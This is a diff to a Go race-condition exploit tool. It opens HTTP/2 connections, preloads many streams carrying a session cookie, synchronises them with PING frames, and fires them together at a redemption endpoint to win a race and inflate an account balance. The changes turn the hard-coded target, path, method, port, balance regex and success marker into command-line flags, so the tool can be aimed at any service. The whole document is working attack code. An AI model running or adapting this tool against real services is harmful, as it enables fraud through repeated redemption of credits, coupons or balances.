@@ -41,7 +41,9 @@ import (
 var (
 	host   string
 	cookie string
-	path   = "/redeem"
+	path   string
+	method string
+	port   int
 )
 
 type Handle struct {
@@ -54,7 +56,7 @@ type Handle struct {
 // ─── Connection setup ────────────────────────────────────────────────
 
 func dialH2() (*tls.Conn, *http2.Framer, error) {
-	raw, err := net.DialTimeout("tcp", host+":443", 10*time.Second)
+	raw, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -115,7 +117,7 @@ func preload(conn *tls.Conn, fr *http2.Framer, streams int) (*Handle, error) {
 	for i := 0; i < streams; i++ {
 		sid := uint32(2*i + 1)
 		hb.Reset()
-		enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
+		enc.WriteField(hpack.HeaderField{Name: ":method", Value: method})
 		enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
 		enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
 		enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
@@ -175,7 +177,10 @@ func pingSync(h *Handle, timeout time.Duration) error {
 
 // ─── Response collection ─────────────────────────────────────────────
 
-var balRe = regexp.MustCompile(`"balance":(\d+)`)
+var (
+	balRe     *regexp.Regexp
+	winMarker []byte
+)
 
 type result struct {
 	balance int
@@ -238,10 +243,12 @@ func harvest(bodies map[uint32]*bytes.Buffer) []result {
 	for _, b := range bodies {
 		data := b.Bytes()
 		r := result{body: data}
-		if m := balRe.FindSubmatch(data); m != nil {
-			r.balance, _ = strconv.Atoi(string(m[1]))
+		if balRe != nil {
+			if m := balRe.FindSubmatch(data); m != nil && len(m) > 1 {
+				r.balance, _ = strconv.Atoi(string(m[1]))
+			}
 		}
-		if bytes.Contains(data, []byte(`"ok":true`)) {
+		if len(winMarker) > 0 && bytes.Contains(data, winMarker) {
 			r.ok = true
 		}
 		out = append(out, r)
@@ -416,10 +423,29 @@ func main() {
 	rounds := flag.Int("rounds", 3, "max rounds")
 	preloadMS := flag.Int("preload-ms", 50, "wait after HEADERS before trigger (ignored if -ping)")
 	usePing := flag.Bool("ping", true, "use PING+ACK sync instead of timed sleep")
-	flag.StringVar(&host, "host", "target.example.com", "target host")
-	flag.StringVar(&cookie, "cookie",
-		"session=PASTE_YOUR_COOKIE_HERE", "session cookie")
+	flag.StringVar(&host, "host", "", "target host (required, no scheme, no path)")
+	flag.StringVar(&cookie, "cookie", "", "full cookie header value, e.g. 'session=abc'")
+	flag.StringVar(&path, "path", "/redeem", "HTTP/2 :path of the racing endpoint")
+	flag.StringVar(&method, "method", "POST", "HTTP method for the racing endpoint")
+	flag.IntVar(&port, "port", 443, "TCP port to connect on")
+	balRegex := flag.String("balance-regex", `"balance":(\d+)`,
+		"regex with one capture group used to extract the numeric balance from a response body")
+	winMark := flag.String("win-marker", `"ok":true`,
+		"substring in a response body that marks a winning race")
 	flag.Parse()
+
+	if host == "" {
+		fmt.Fprintln(flag.CommandLine.Output(), "[-] -host is required")
+		flag.Usage()
+		return
+	}
+	var err error
+	balRe, err = regexp.Compile(*balRegex)
+	if err != nil {
+		fmt.Fprintf(flag.CommandLine.Output(), "[-] bad -balance-regex: %v\n", err)
+		return
+	}
+	winMarker = []byte(*winMark)
 
 	fmt.Printf("[*] Target  : https://%s%s\n", host, path)
 	fmt.Printf("[*] Burst   : %d reqs (%d × %d)\n", (*nConns)*(*streams), *nConns, *streams)
